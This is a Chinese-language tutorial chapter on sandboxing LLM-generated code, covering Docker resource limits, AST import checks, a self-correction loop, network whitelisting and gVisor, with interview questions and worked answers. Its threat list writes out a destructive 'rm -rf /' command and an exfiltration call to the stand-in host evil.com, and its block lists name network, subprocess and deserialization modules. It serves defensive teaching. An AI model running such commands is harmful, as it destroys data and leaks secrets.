# 07 - 代码沙箱

> 让 LLM 写代码并真的跑起来,这是 Agent 工程的重头戏。
> 涵盖:三档执行模式、Docker 沙箱、AST 静态检查、自我纠错、安全护栏。

---

## 7.1 风险:LLM 生成代码不能直接跑

### 真实威胁
- `os.system("rm -rf /")` 类危险命令
- `urllib.request.urlopen("evil.com")` 数据外泄
- 死循环 / 内存爆炸
- 写入宿主机敏感目录

### 错误做法
```python
exec(llm_generated_code)  # ❌ 直接在你的进程里跑,等于授权 LLM 全权
```

---

## 7.2 三档执行模式(本项目设计)

```
        ┌─ Step A: 生成代码(快, 1 min) ─── 总是执行
模块 6 ─┤
        └─ Step B: 沙箱验证(慢, 3-10 min) ── 开关控制
```

| mode | 行为 | 耗时 | 场景 |
|------|------|------|------|
| `generate_only` | 只产代码文件,不跑 | +1 min | **日常开发(默认)** |
| `dry_run` | AST 语法检查 + import 分析 | +2 min | 想保证无低级错误 |
| `full_execute` | Docker 沙箱实跑 toy + 自我纠错 | +3-10 min | 最终版本 |

### 为什么分档?
- 默认便宜:开发期不必每次都开沙箱
- 渐进式:先生成,看着满意再跑
- **省 token**:full_execute 内含纠错循环,可能调用 LLM 5 次

---

## 7.3 Step A:代码生成

```python
SYSTEM = """\
你是 ML 工程师。基于实验方案生成最小可行代码仓库。
返回 JSON: {"files": {"main.py": "...", "train.py": "...", "README.md": "..."}}
要求:
- HuggingFace 标准接口
- requirements.txt 列依赖
- README 说明运行
"""
```

### 文件落盘(防目录穿越)
```python
def save_files(files, dir_path):
    for name, content in files.items():
        safe = name.replace("..", "").lstrip("/\\")  # 防 ../../etc/passwd
        path = dir_path / safe
        path.parent.mkdir(parents=True, exist_ok=True)
        path.write_text(content, encoding="utf-8")
```

---

## 7.4 Step B 模式 1:dry_run(AST 静态检查)

```python
import ast

def dry_run(dir_path):
    errors = []
    for py in dir_path.rglob("*.py"):
        try:
            ast.parse(py.read_text())
        except SyntaxError as e:
            errors.append(f"{py.name}: {e}")
    return {"ok": not errors, "errors": errors}
```

### 进阶:import 黑名单检查
```python
DANGEROUS = {"os.system", "subprocess", "eval", "exec"}

def check_imports(tree):
    for node in ast.walk(tree):
        if isinstance(node, ast.Import):
            for alias in node.names:
                if alias.name in DANGEROUS:
                    return False
    return True
```

---

## 7.5 Step B 模式 2:Docker 沙箱

### 为什么 Docker
- **进程隔离**:不能访问宿主机文件
- **资源限制**:CPU/内存/磁盘上限
- **网络隔离**:可关网络或限白名单
- **崩了无影响**:容器死了 host 没事

### 基础调用
```python
import docker

client = docker.from_env()
output = client.containers.run(
    image="python:3.11-slim",
    command="bash -c 'pip install -r requirements.txt && python main.py --toy'",
    volumes={str(code_dir): {"bind": "/workspace", "mode": "ro"}},  # 只读!
    working_dir="/workspace",
    mem_limit="2g",
    cpu_period=100000,
    cpu_quota=200000,        # 2 核
    network_mode="bridge",   # 默认网络
    detach=False,
    stdout=True, stderr=True,
    remove=True,             # 跑完删容器
)
```

### 关键安全参数
| 参数 | 作用 |
|------|------|
| `mode="ro"` | 代码目录只读,LLM 改不了源码 |
| `mem_limit="2g"` | 防内存爆炸 |
| `cpu_quota` | CPU 配额 |
| `network_mode` | 设 `none` 完全断网,或自定义白名单 |
| `remove=True` | 防容器堆积占磁盘 |

### 进阶:gVisor / Kata Containers
普通 Docker 仍共享宿主机内核,理论上有内核漏洞逃逸风险。
高安全要求:用 **gVisor**(Google,用户态内核)或 **Kata**(微 VM)。

---

## 7.6 自我纠错循环

### 思路
```
生成代码 → 沙箱跑 → 失败 → 错误回喂 LLM → 修复 → 重试
```
跟 chat_json 自动重试是同一思想:让 LLM 看错误自我修正。

### 实现
```python
def execute_with_retry(code, max_retries=3):
    last_error = ""
    for attempt in range(max_retries):
        try:
            return docker_run(code)
        except Exception as e:
            last_error = str(e)
            # 让 LLM 看错误改代码
            code = llm.fix_code(code, error=last_error)
    return {"ok": False, "error": last_error}
```

### 何时停止
- 跑通 → 直接返回
- 5 轮还失败 → 放弃,标记错误,降级 generate_only
- token 超预算 → 强制停

---

## 7.7 LangGraph interrupt 让用户选档位

```python
# 编译时声明
graph = g.compile(
    checkpointer=cp,
    interrupt_before=["m6_execute"],  # 这步前暂停
)

# 第一次跑(到 m6_execute 前停)
state = graph.invoke(initial, config=cfg)
# state 已含 generated code,等用户选档位

# 用户选了
graph.update_state(cfg, {"execution_mode": "full_execute"})
state = graph.invoke(None, config=cfg)  # 续跑
```

### 前端配套
```
[模块 5] 实验方案完成 ✅
[模块 6] 即将进入代码生成
  [1] 仅生成(默认, ~1 min)
  [2] 语法检查(~2 min)
  [3] 沙箱实跑(~5-10 min)
请选择: _
```

📌 **项目对应**:`backend/co_scientist/modules/m6_code/code_gen.py`

---

## 7.8 网络访问控制

### 完全断网(最安全)
```python
network_mode="none"
```
代码连不上任何外部服务,但 `pip install` 也不行。

### 白名单(实用)
方法 1:用 host 上的代理过滤
```python
network_mode="bridge"
extra_hosts={"pypi.org": "151.101.0.223"}  # 只准 pypi
# 配合 iptables 拦截其他出站
```

方法 2:用 Docker 自定义网络
```bash
docker network create --internal trusted-net
docker run --network trusted-net ...
```

---

## 7.9 资源监控

### 实时统计
```python
container = client.containers.run(..., detach=True)
for stats in container.stats(stream=True):
    cpu = stats["cpu_stats"]["cpu_usage"]["total_usage"]
    mem = stats["memory_stats"]["usage"]
    if mem > MAX_MEM:
        container.kill()
        break
```

### 超时
```python
import threading

def kill_after(container, sec):
    threading.Timer(sec, container.kill).start()

container = client.containers.run(..., detach=True)
kill_after(container, 300)  # 5 分钟超时
result = container.wait()
```

---

## 7.10 LLM 写代码的 Prompt 技巧

### 技巧 1:提供 dataset 信息让代码可跑
```
数据集:MMLU
HuggingFace 路径:cais/mmlu
样本数:15908
字段:question, choices, answer
```

### 技巧 2:要求 toy 参数
```
请确保代码支持 --toy 参数,加上后只用 10 条样本跑通流程,便于沙箱测试。
```

### 技巧 3:统一输出接口
```
评估结果必须输出到 metrics.json,格式:
{"accuracy": float, "f1": float, "loss": float}
```
方便下游程序读。

### 技巧 4:requirements 锁版本
```
requirements.txt 必须列具体版本号,避免 latest 导致 API 变化。
```

---

## 📝 面试常见问题

1. **为什么不能直接 exec LLM 代码?**
   - 没有隔离,DROP 数据库 / 删文件 / 偷密钥都可能

2. **三档模式的好处?**
   - 默认便宜,渐进式,工程判断力体现

3. **Docker 沙箱关键安全参数?**
   - mem_limit、cpu_quota、network_mode、ro mount、remove

4. **gVisor vs 普通 Docker?**
   - gVisor 用户态内核,防内核漏洞逃逸,代价是 5-10% 性能

5. **自我纠错循环如何防死循环?**
   - max_retries 上限 + 评分停滞停止 + token 预算硬限

6. **interrupt_before 怎么和前端配合?**
   - 跑到断点 → 返回当前 state → 前端展示选项 → update_state → 续跑

---

## 🎯 练手题

1. 给 dry_run 加 import 黑名单检查
2. 实现 full_execute 的资源监控:超内存自动 kill
3. 把"自我纠错"做完整:错误回喂 LLM,LLM 输出 patch,re-run
4. 用 gVisor 替代普通 Docker,跑通对比

---

## ✅ 练手题参考答案

### 答案 1:import 黑名单

用 AST 静态扫描,不需要真执行:
```python
import ast

DANGEROUS_IMPORTS = {
    "os", "subprocess", "sys", "socket", "shutil",
    "requests", "urllib", "http",             # 网络外联
    "ctypes", "multiprocessing",               # 进程控制
    "pickle", "marshal", "shelve",             # 反序列化 RCE
}

def check_imports(code: str) -> list[str]:
    """返回命中黑名单的模块名列表;空列表 = 安全。"""
    try:
        tree = ast.parse(code)
    except SyntaxError as e:
        return [f"__syntax_error__: {e}"]
    bad = []
    for node in ast.walk(tree):
        if isinstance(node, ast.Import):
            for alias in node.names:
                top = alias.name.split(".")[0]
                if top in DANGEROUS_IMPORTS:
                    bad.append(alias.name)
        elif isinstance(node, ast.ImportFrom):
            top = (node.module or "").split(".")[0]
            if top in DANGEROUS_IMPORTS:
                bad.append(node.module)
    return bad
```

在 `m6_code/code_gen.py` 的 dry_run 分支开头调用,命中就拒绝执行。

要点:
- **静态扫描比运行时黑名单更早发现问题**,不用真 spawn 容器
- 注意 `__import__("os")` 这种动态导入会漏掉,所以还要 runtime 的 sandbox 双重保险
- `ast.walk` 递归整个树,连嵌套函数里的 import 都能扫到

### 答案 2:资源监控 + OOM kill

**代码现状**:`m6_code/code_gen.py:152-165` 的 `full_execute_sandbox` 已经配了 `mem_limit="2g"`、`cpu_period/cpu_quota`、`network_mode="bridge"`。**缺的是**:
- 没开 `detach=True`,拿不到 OOMKilled 状态
- 没禁 swap(少 `memswap_limit`),内存限制可能被 swap 绕开
- 没有 wall-clock timeout
- 容器跑完直接 `remove=True` 丢掉 exit code 细节

本题在现有代码基础上改造(不是从零写):

```python
# 改 m6_code/code_gen.py 的 full_execute_sandbox 内部
container = client.containers.run(
    image="python:3.11-slim",
    command="bash -c 'pip install -q -r requirements.txt && python main.py --toy'",
    volumes={str(dir_path): {"bind": "/workspace", "mode": "ro"}},
    working_dir="/workspace",
    mem_limit="2g",
    memswap_limit="2g",          # ← 新增:禁用 swap,否则 OOM 检测不准
    cpu_period=100000,
    cpu_quota=200000,
    network_mode="bridge",
    detach=True,                 # ← 改:原来是 False(同步拿结果),detach 才能拿 OOMKilled
    stdout=True, stderr=True,
    # remove=True,               # ← 去掉:要先读 wait 结果再手动 remove
)
try:
    status = container.wait(timeout=300)   # ← 新增 wall-clock 上限
    logs_text = container.logs().decode("utf-8", errors="ignore")
    oom = status.get("OOMKilled", False)
    exit_code = status["StatusCode"]
    if oom:
        logger.warning("[M6] 容器 OOM 被 kill: mem_limit=2g")
    return {"mode": "full_execute", "ok": exit_code == 0 and not oom,
            "exit_code": exit_code, "oom": oom, "logs": [logs_text],
            "attempts": attempt + 1}
except Exception as e:
    # 超时走这里
    try: container.kill()
    except Exception: pass
    last_error = f"timeout or error: {e}"
finally:
    try: container.remove(force=True)
    except Exception: pass
```

要点:
- **`mem_limit` + `memswap_limit` 要等同**,否则 Docker 会偷偷让你用 swap,OOM 不触发
- **`OOMKilled` 字段在 `container.wait()` 的返回里**,不是 `container.stats()`;想拿这个字段必须 detach + wait
- **超时另处理**(`container.wait(timeout=...)`),Docker 本身没有 wall-clock 限制
- 现有代码 `remove=True` 和 detach 二选一,想要 OOM 信号就要自己 remove

### 答案 3:完整自我纠错

**代码现状**:`full_execute_sandbox(dir_path, max_retries=3)` **已经有 3 次重试的外层循环**(`code_gen.py:150`),但第 171 行明确写着"简化起见只重试"——失败后没把 error 回喂 LLM,只是同样的代码再跑一次,毫无意义。本题是**把这个循环补成真正的 self-correction**。

改造点在 `full_execute_sandbox` 的 except 分支里——拿到错误后调用 LLM 生成补丁,重写磁盘上的文件,下一轮循环就会跑新代码:

```python
# m6_code/code_gen.py 改 full_execute_sandbox
def full_execute_sandbox(dir_path: Path, max_retries: int = 3) -> dict:
    import docker
    client = docker.from_env()
    logs: list[str] = []
    last_error = ""

    for attempt in range(max_retries):
        try:
            container = client.containers.run(
                # ... 同前(见答案 2 的改造版)
                detach=True, memswap_limit="2g",
            )
            status = container.wait(timeout=300)
            exit_code = status["StatusCode"]
            oom = status.get("OOMKilled", False)
            log_text = container.logs().decode("utf-8", errors="ignore")
            container.remove(force=True)
            logs.append(log_text)
            if exit_code == 0 and not oom:
                return {"mode": "full_execute", "ok": True, "logs": logs, "attempts": attempt + 1}
            last_error = f"exit={exit_code} oom={oom}\n{log_text[-2000:]}"
        except Exception as e:
            last_error = str(e)

        # ---- 新增:把错误回喂给 LLM,重写代码文件 ----
        if attempt < max_retries - 1:
            patch = _ask_llm_for_patch(dir_path, last_error)
            if patch:
                _apply_patch(dir_path, patch)
                logger.info("[M6] 第 {} 轮纠错:已根据错误更新 {} 个文件",
                            attempt + 1, len(patch))
            else:
                logger.warning("[M6] LLM 未返回有效补丁,直接重试")

    return {"mode": "full_execute", "ok": False, "error": last_error,
            "logs": logs, "attempts": max_retries}


def _ask_llm_for_patch(dir_path: Path, error_log: str) -> dict[str, str] | None:
    """返回 {filename: new_full_content} 映射。用完整重写而非 diff,避免 patch 失败。"""
    # 把目录下所有 .py/.txt 读出来
    files = {p.relative_to(dir_path).as_posix(): p.read_text(encoding="utf-8")
             for p in dir_path.rglob("*") if p.is_file() and p.suffix in (".py", ".txt")}
    llm = get_llm("reasoner")
    resp = llm.chat_json(
        messages=[
            {"role": "system", "content":
             "你是代码修复助手。根据执行错误,给出需要修改的文件的完整新内容。"
             "返回 JSON: {\"patches\": {\"filename.py\": \"完整新文件内容\", ...}}。"
             "只列需要改的文件,无改动的不要列。"},
            {"role": "user", "content":
             f"当前代码目录:\n" +
             "\n".join(f"=== {k} ===\n{v}" for k, v in files.items()) +
             f"\n\n执行错误(末尾 2000 字):\n{error_log[-2000:]}"},
        ],
        purpose="m6_self_correct",
    )
    return resp.get("patches") or None


def _apply_patch(dir_path: Path, patch: dict[str, str]) -> None:
    for rel, content in patch.items():
        target = dir_path / rel
        target.parent.mkdir(parents=True, exist_ok=True)
        target.write_text(content, encoding="utf-8")
```

要点:
- **要完整文件内容而非 diff**:diff 应用容易对不齐,尤其 LLM 偶尔会输出错位的 hunk,全文件最稳
- **截断错误 logs 到最后 2000 字**:OOM 或死循环的 logs 可能极长,截断避免爆 context
- **3 轮上限基本够**:覆盖 80% 的 import 错 / typo / 函数签名错;仍失败多半是算法设计错,再重试也救不了
- 本题的关键是**让原本的"重试"真的产生新代码**,而不是让同样的错在同样的代码上再 crash 一次

### 答案 4:gVisor 对比

装 gVisor(Linux 宿主):
```bash
# 安装 runsc
curl -fsSL https://gvisor.dev/archive.key | sudo gpg --dearmor -o /usr/share/keyrings/gvisor-archive-keyring.gpg
echo "deb [signed-by=/usr/share/keyrings/gvisor-archive-keyring.gpg] https://storage.googleapis.com/gvisor/releases release main" | sudo tee /etc/apt/sources.list.d/gvisor.list > /dev/null
sudo apt-get update && sudo apt-get install -y runsc

# 注册到 Docker
sudo runsc install
sudo systemctl restart docker
```

代码里只改一行 `runtime`:
```python
container = client.containers.run(
    "python:3.11-slim",
    [...],
    runtime="runsc",   # ← 默认是 "runc",改成 gVisor
    ...
)
```

对比(跑 100 次简单脚本):
| 指标 | runc(默认) | runsc(gVisor) |
|---|---|---|
| 启动延迟 | ~300ms | ~600ms |
| 脚本吞吐 | 基线 | 慢 ~20% |
| 内核隔离 | 共享宿主内核 | 用户态内核,逃逸面大幅缩小 |

要点:
- **gVisor 的代价是性能 + 部分 syscall 不兼容**(某些 C 扩展跑不起来)
- 适合"不完全可信代码"场景(本项目 m6 正是)
- 不适合需要高性能 syscall 的工作(如大量文件 IO)
